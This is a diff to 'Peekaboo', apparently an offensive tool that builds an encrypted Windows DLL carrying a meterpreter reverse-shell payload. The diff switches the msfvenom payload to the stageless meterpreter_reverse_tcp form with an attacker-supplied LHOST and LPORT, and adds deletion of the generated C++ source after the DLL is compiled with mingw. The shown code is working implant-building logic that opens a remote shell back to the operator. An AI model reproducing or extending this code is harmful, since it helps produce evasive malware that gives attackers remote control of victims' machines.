@@ -53,7 +53,7 @@ class PeekabooEncryptor():
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
-    msfv = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
+    msfv = "msfvenom -p windows/x64/meterpreter_reverse_tcp"
     msfv += " LHOST=" + host
     msfv += " LPORT=" + port
     msfv += " -f raw"
@@ -125,6 +125,7 @@ def run_peekaboo(host, port):
     try:
         cmd = "x86_64-w64-mingw32-g++ -shared -o peekaboo.dll peekaboo-enc.cpp -fpermissive >/dev/null 2>&1"
         os.system(cmd)
+        os.remove("peekaboo-enc.cpp")
     except:
         print (Colors.RED + "error compiling template :(" + Colors.ENDC)
         sys.exit()
